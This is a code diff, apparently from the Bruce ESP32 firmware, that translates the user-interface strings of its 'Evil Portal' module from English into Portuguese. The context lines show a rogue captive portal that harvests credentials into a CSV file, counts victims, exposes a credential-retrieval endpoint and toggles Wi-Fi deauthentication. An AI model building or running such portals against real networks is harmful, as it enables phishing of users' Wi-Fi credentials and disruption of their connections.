@@ -77,14 +77,14 @@ bool EvilPortal::setup() {
     }
 
     options = {
-        {"Custom Html", [this]() { loadCustomHtml(); }}
+        {"HTML personalizado", [this]() { loadCustomHtml(); }}
     };
     addOptionToMainMenu();
 
     if (!_verifyPwd) {
-        options.insert(options.begin(), {"Default", [this]() { loadDefaultHtml(); }});
+        options.insert(options.begin(), {"Padrao", [this]() { loadDefaultHtml(); }});
     } else {
-        options.insert(options.begin(), {"Default", [this]() { loadDefaultHtml_one(); }});
+        options.insert(options.begin(), {"Padrao", [this]() { loadDefaultHtml_one(); }});
     }
 
     loopOptions(options);
@@ -98,7 +98,7 @@ bool EvilPortal::setup() {
             apName_from_keyboard();
         } else {
             options = {
-                {"Custom Wifi", [this]() { apName_from_keyboard(); }}
+                {"WiFi personalizado", [this]() { apName_from_keyboard(); }}
             };
             for (const auto &_wifi : bruceConfig.evilWifiNames) {
                 options.emplace_back(_wifi.c_str(), [this, _wifi]() { this->apName = _wifi; });
@@ -108,7 +108,7 @@ bool EvilPortal::setup() {
     }
 
     options = {
-        {"Default",
+        {"Padrao",
          [this]() {
              if (!apGateway.fromString(bruceConfig.evilPortalGatewayIp)) apGateway = IPAddress(172, 0, 0, 1);
          }                                                                 },
@@ -124,8 +124,8 @@ bool EvilPortal::setup() {
 
 void EvilPortal::beginAP() {
     if (!_backgroundMode) {
-        drawMainBorderWithTitle("EVIL PORTAL");
-        displayTextLine("Starting...");
+        drawMainBorderWithTitle("PORTAL MALICIOSO");
+        displayTextLine("Iniciando...");
     }
     if (_verifyPwd) WiFi.mode(WIFI_MODE_APSTA);
     else WiFi.mode(WIFI_MODE_AP);
@@ -325,26 +325,26 @@ void EvilPortal::loop() {
 
         if (check(EscPress)) {
             options = {
-                {"Exit Portal", [&exitPortal]() { exitPortal = true; }},
-                {"View Creds",
+                {"Sair do portal", [&exitPortal]() { exitPortal = true; }},
+                {"Ver credenciais",
                  [this, &shouldRedraw]() {
                      FS *fs;
                      if (getFsStorage(fs)) {
                          if (fs->exists("/BruceEvilCreds")) {
                              loopSD(*fs, false, "CSV", "/BruceEvilCreds");
                          } else {
-                             displayTextLine("No credentials yet");
+                             displayTextLine("Sem credenciais");
                              vTaskDelay(1000);
                          }
                      }
                      shouldRedraw = true;
                  }},
-                {"Resume", [&shouldRedraw]() { shouldRedraw = true; }}
+                {"Continuar", [&shouldRedraw]() { shouldRedraw = true; }}
             };
 
             loopOptions(options);
             if (exitPortal) {
-                displayTextLine("Shutting down...");
+                displayTextLine("Encerrando...");
                 vTaskDelay(100 / portTICK_PERIOD_MS);
 
                 webServer.end();
@@ -426,7 +426,7 @@ void EvilPortal::checkAndExtendDuration() {
 }
 
 void EvilPortal::drawScreen() {
-    drawMainBorderWithTitle("EVIL PORTAL");
+    drawMainBorderWithTitle("PORTAL MALICIOSO");
 
     String subtitle = "AP: " + apName.substring(0, 30);
     if (apName.length() > 30) subtitle += "...";
@@ -436,36 +436,36 @@ void EvilPortal::drawScreen() {
     padprintln("");
     if (bruceConfig.evilPortalEndpoints.showEndpoints) {
         if (bruceConfig.evilPortalEndpoints.allowGetCreds) {
-            padprintln("-> " + apIp + bruceConfig.evilPortalEndpoints.getCredsEndpoint + " -> get creds");
+            padprintln("-> " + apIp + bruceConfig.evilPortalEndpoints.getCredsEndpoint + " -> obter creds");
         } else {
-            padprintln("-> cred access disabled");
+            padprintln("-> acesso a creds desativado");
         }
         if (bruceConfig.evilPortalEndpoints.allowSetSsid) {
-            padprintln("-> " + apIp + bruceConfig.evilPortalEndpoints.setSsidEndpoint + " -> set ssid");
+            padprintln("-> " + apIp + bruceConfig.evilPortalEndpoints.setSsidEndpoint + " -> definir SSID");
         } else {
-            padprintln("-> SSID change disabled");
+            padprintln("-> troca de SSID desativada");
         }
     } else {
-        padprintln("Endpoints hidden");
+        padprintln("Endpoints ocultos");
     }
     padprintln("");
 
-    padprintln("Captive Portal: ACTIVE");
-    padprintln("Notifications: ENABLED");
+    padprintln("Portal cativo: ATIVO");
+    padprintln("Notificacoes: ATIVAS");
 
     if (!_verifyPwd) {
-        padprint("Victims: " + String(totalCapturedCredentials));
+        padprint("Vitimas: " + String(totalCapturedCredentials));
     } else {
-        padprint("Attempt: " + String(totalCapturedCredentials));
+        padprint("Tentativa: " + String(totalCapturedCredentials));
     }
     String passMode = "";
     switch (bruceConfig.evilPortalPasswordMode) {
-        case FULL_PASSWORD: passMode = "Full"; break;
+        case FULL_PASSWORD: passMode = "Completa"; break;
         case FIRST_LAST_CHAR: passMode = "p******d"; break;
-        case HIDE_PASSWORD: passMode = "*hidden*"; break;
-        case SAVE_LENGTH: passMode = "Length only"; break;
+        case HIDE_PASSWORD: passMode = "*oculta*"; break;
+        case SAVE_LENGTH: passMode = "So tamanho"; break;
     }
-    padprintln("Pwd mode: " + passMode);
+    padprintln("Modo senha: " + passMode);
     printLastCapturedCredential();
     printDeauthStatus();
 }
@@ -485,10 +485,10 @@ void EvilPortal::printLastCapturedCredential() {
 
 void EvilPortal::printDeauthStatus() {
     if (!_deauth || isDeauthHeld) {
-        printFootnote("Deauth OFF");
+        printFootnote("Deauth INATIVO");
     } else {
         tft.setTextColor(TFT_RED);
-        printFootnote("Deauth ON");
+        printFootnote("Deauth ATIVO");
         tft.setTextColor(bruceConfig.priColor);
     }
 }
@@ -842,7 +842,7 @@ void EvilPortal::saveToCSV(const String &csvLine, bool isAPname) {
 }
 
 void EvilPortal::apName_from_keyboard() {
-    apName = keyboard("Free Wifi", 30, "Evil Portal SSID:");
+    apName = keyboard("Free Wifi", 30, "SSID do portal:");
     if (apName == "\x1B") apName = "Free Wifi";
 }
 
